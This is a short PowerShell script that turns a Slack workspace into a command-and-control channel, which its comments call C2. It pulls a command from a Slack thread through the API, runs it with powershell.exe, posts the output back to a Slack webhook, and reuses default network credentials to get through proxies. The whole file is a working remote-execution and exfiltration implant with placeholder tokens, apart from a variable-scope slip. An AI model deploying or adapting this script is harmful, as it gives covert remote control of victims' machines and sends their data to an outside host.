Function Send-SlackMessage {
    # Add the "Incoming WebHooks" integration to get started: https://slack.com/apps/A0F7XDUAZ-incoming-webhooks
    param (
        [Parameter(Mandatory=$true, Position=0)]$Text,
        $Url="https://hooks.slack.com/services/XXXXXXXXX/XXXXXXXXXXXXXXXXX/XXXXXXXXXXXXXX", #place your slack hook URL here
        $icon_url
    )
    
    $body = @{ text=$Text} | ConvertTo-Json
    Invoke-WebRequest -Method Post -Uri $Url -Body $body
}

# For the below code an app will need to be added to the slack workspace used for C2. This can be done at https://api.slack.com/apps 
# Once the app is created it will need a token made in the OAth section of the app and the scopes of channels:read, channels:history, and 
incoming-webhook added.
# To discover the channel ID run Invoke-WebRequest https://slack.com/api/channels.list?token=insert app OAth token here | select-object -Property content -ExpandProperty content
# To discver a messages TS run Invoke-WebRequest https://slack.com/api/converstation.history?token=insert app OAth token here"&"channel=insert channel id here | select-object -Property content -ExpandProperty content

Function Get-CMD {
$content=Invoke-WebRequest https://slack.com/api/conversations.replies?token=insert slackbot token here"&"channel=insert channel id here"&"ts=insert C2 message ts value here | select content
$content.tostring()
$cmd=convertfrom-json $content.content
$cmd2=$cmd.messages | foreach {$_.text}
}

[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials #This line tells the system to use the default proxy

Get-CMD
$tosend=powershell.exe $cmd2 | Out-String
Send-SlackMessage "$tosend"

